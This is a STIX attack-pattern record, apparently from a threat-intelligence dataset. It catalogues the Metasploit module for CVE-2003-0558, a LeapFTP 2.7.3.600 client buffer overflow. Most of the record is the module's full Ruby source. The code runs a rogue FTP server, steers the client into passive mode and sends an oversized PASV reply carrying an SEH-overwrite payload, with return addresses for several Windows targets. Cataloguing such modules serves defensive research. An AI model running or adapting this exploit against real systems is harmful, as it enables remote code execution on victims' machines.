{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dcbd10eb-50e9-4d1b-b8c1-89ebd0271705",
    "created": "2024-08-14T16:51:22.693396Z",
    "modified": "2024-08-14T16:51:22.6934Z",
    "name": "LeapWare LeapFTP v2.7.3.600 PASV Reply Client Overflow",
    "description": " This module exploits a buffer overflow in the LeapWare LeapFTP v2.7.3.600 client that is triggered through an excessively long PASV reply command. This module was ported from the original exploit by drG4njubas with minor improvements. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/leapftp_pasv_reply.rb",
            "external_id": "leapftp_pasv_reply.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0558"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LeapWare LeapFTP v2.7.3.600 PASV Reply Client Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the LeapWare LeapFTP v2.7.3.600\n        client that is triggered through an excessively long PASV reply command. This\n        module was ported from the original exploit by drG4njubas with minor improvements.\n      },\n      'Author' \t => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0558' ],\n          [ 'OSVDB', '4587' ],\n          [ 'BID', '7860' ],\n          [ 'EDB', '54' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\().,\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Patrick - Tested against w2k sp0, sp4, xp sp0, xp sp2 en OK.\n          [ 'Universal LeapFTP.exe', \t{ 'Ret' => 0x004bdd24 } ], # p/p/r LeapFTP.exe\n          [ 'Windows 2000 SP0/4 English', { 'Ret' => 0x75022ac4 } ], # p/p/r ws2help.dll\n          [ 'Windows XP SP0 English',\t{ 'Ret' => 0x7660139c }\t], # p/p/r cscdll.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2003-06-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The FTP daemon port to listen on\", 21 ]),\n        OptString.new('SRVNAME', [ true, \"Welcome to the ... FTP Service\", \"Test\" ]),\n      ])\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    buffer = \"220 Welcome to the \" + datastore['SRVNAME'] + \" FTP Service.\\r\\n\"\n    client.put(buffer)\n  end\n\n  def on_client_data(client)\n\n\n    client.get_once\n\n    # This could be improved if anyone wants to write a FTP server API.\n    user = \"331 Please specify the password.\\r\\n\"\n    client.put(user)\n\n    client.get_once\n    pass = \"230 Login successful.\\r\\n\"\n    client.put(pass)\n\n    client.get_once\n    syst = \"215 Windows_NT 5.1\\r\\n\"\n    client.put(syst)\n\n    client.get_once\n    rest = \"350 Restart position accepted (100).\\r\\n\"\n    client.put(rest)\n\n    client.get_once\n    rest = \"350 Restart position accepted (0).\\r\\n\"\n    client.put(rest)\n\n    client.get_once\n    pwd = \"257 \\\"/\\\"\\r\\n\"\n    client.put(pwd)\n\n    client.get_once\n    type = \"200 Switching to ASCII mode.\\r\\n\"\n    client.put(type)\n\n    client.get_once\n    port = \"500 Illegal PORT command.\\r\\n\" # We force LeapFTP to use PASV. It will try PORT first.\n    client.put(port)\n\n    client.get_once\n    pasv = \"227 Entering Passive Mode (\"\n    pasv << rand_text_numeric(1053) + generate_seh_payload(target.ret)\n    pasv << \",\" + rand_text_numeric(1)\n    pasv << \",\" + rand_text_numeric(1)\n    pasv << \",\" + rand_text_numeric(1)\n    pasv << \",\" + rand_text_numeric(1)\n    pasv << \",\" + rand_text_numeric(1)\n    pasv << \")\\r\\n\"\n\n    client.put(pasv)\n\n    handler(client)\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-06-09",
    "x_mitre_platforms": [
        "win'"
    ]
}